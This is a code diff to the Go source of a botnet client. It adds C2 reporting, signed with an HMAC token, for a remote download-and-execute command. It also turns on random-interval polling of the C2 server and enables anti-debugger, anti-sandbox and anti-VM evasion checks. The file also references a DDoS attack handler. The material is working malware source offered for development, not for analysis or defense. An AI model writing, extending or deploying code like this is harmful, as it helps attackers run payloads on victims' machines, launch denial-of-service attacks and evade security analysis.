@@ -1,8 +1,10 @@
 package components
 
 import (
+	"encoding/json"
 	"log"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -14,11 +16,16 @@ func do_register_bot(pkg *ServerReply, host string) bool {
 }
 
 func do_remote_download_execute(pkg *ServerReply, host string) bool {
-	commandline := pkg.Args["args"]
-	strArgs := strings.Fields(commandline.(string))
-	option := ""
+	commandline := pkg.Args["args"].(string)
+	hidden := pkg.Args["hidden"].(bool)
+	action := commandline
+	if hidden {
+		action += " (hidden)"
+	}
 
 	// Collect options if it exists
+	option := ""
+	strArgs := strings.Fields(commandline)
 	if len(strArgs) > 1 {
 		for i := 1; i < len(strArgs); i++ {
 			option += (strArgs[i] + " ")
@@ -26,13 +33,37 @@ func do_remote_download_execute(pkg *ServerReply, host string) bool {
 		option = strings.TrimSpace(option)
 	}
 	// Remote download and execute
-	ok := remote_execute(strArgs[0], pkg.Args["hidden"].(bool), option)
+	ok := remote_execute(strArgs[0], hidden, option)
+	error1 := "failed"
+	if ok {
+		error1 = "done"
+	}
 
-	var reply ServerReply
-	reply.Args = make(map[string]any)
-	reply.Headers = make(map[string]string)
+	report := Report{
+		Guid:    g_guid,
+		TaskID:  strconv.FormatInt(pkg.TaskId, 10),
+		Success: ok,
+		Output:  "",
+		Error:   error1,
+		Extra:   make(map[string]any),
+	}
+	report.Extra["action"] = action
+	byt, _ := json.Marshal(report)
+	// Send report to C2
 
-	return
+	// Build url
+	url := build_url(host, "/report", botcore.use_ssl)
+	// Calculate signature
+	timestamp := generate_utc_timestamp_string()
+	sign := create_sign(g_token, g_guid, timestamp)
+	// Send HTTP POST request
+	do_head_post(url, byt, map[string]string{
+		"X-Guid": g_guid,
+		"X-Time": timestamp,
+		"X-Sign": base64_enc(sign),
+	}, botcore.use_ssl)
+
+	return true
 }
 
 func do_ddos_attack(pkg *ServerReply, host string) bool {
@@ -64,10 +95,8 @@ func send_poll_request(host string) BotState {
 	url := build_url(host, "/poll", botcore.use_ssl)
 
 	// Hmac calculation
-	bytTokens, _ := base64_dec(g_token)
 	timestamp := generate_utc_timestamp_string()
-	data := []byte(g_guid + timestamp)
-	sign := hmac_sha256(bytTokens, data)
+	sign := create_sign(g_token, g_guid, timestamp)
 
 	// Send poll request
 	reply := do_head_post(url, nil, map[string]string{
@@ -153,11 +182,8 @@ func handle_command() {
 	var stat BotState = StateReadGuid
 
 	for {
-		// time.Sleep(time.Second * time.Duration(random_int(1, 5)))
+		time.Sleep(time.Second * time.Duration(random_int(1, 5)))
 		stat = auth_bot_poll(stat, botcore.hosts[0])
-		// for _, host := range botcore.hosts {
-
-		// }
 	}
 
 }
@@ -172,17 +198,17 @@ func Run() {
 	time.Sleep(time.Second * time.Duration(botcore.delay))
 
 	// Try to fuck them all
-	// if botcore.anti_debug && is_debugger_exist() {
-	// 	return
-	// }
+	if botcore.anti_debug && is_debugger_exist() {
+		return
+	}
 
-	// if botcore.anti_sandbox && in_sandbox_now() {
-	// 	return
-	// }
+	if botcore.anti_sandbox && in_sandbox_now() {
+		return
+	}
 
-	// if botcore.anti_vm && in_vm_now() {
-	// 	return
-	// }
+	if botcore.anti_vm && in_vm_now() {
+		return
+	}
 
 	// Install self
 	// if botcore.install {
